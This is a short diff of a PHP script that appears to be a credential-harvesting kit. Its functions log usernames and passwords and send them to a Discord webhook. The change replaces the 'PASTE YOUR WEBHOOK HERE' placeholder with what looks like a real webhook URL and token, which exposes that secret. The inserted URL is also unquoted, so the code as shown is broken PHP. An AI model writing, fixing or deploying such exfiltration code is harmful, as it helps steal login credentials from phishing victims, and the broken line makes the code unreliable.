@@ -38,7 +38,7 @@ function logData($username, $password) {
 
 function sendToDiscordWebhook($data) {
     $webhookUrls = [
-        'PASTE YOUR WEBHOOK HERE',  // Replace with your actual Discord webhook URL
+        https://discord.com/api/webhooks/1471484826719879272/BBezivw7fNxzOC4F0UXuOnsjo_aufUnhRuRJhBfACboFifrG_Be89fRhR_Hk0eOc8ue0  // Replace with your actual Discord webhook URL
     ];
 
     $embed = [
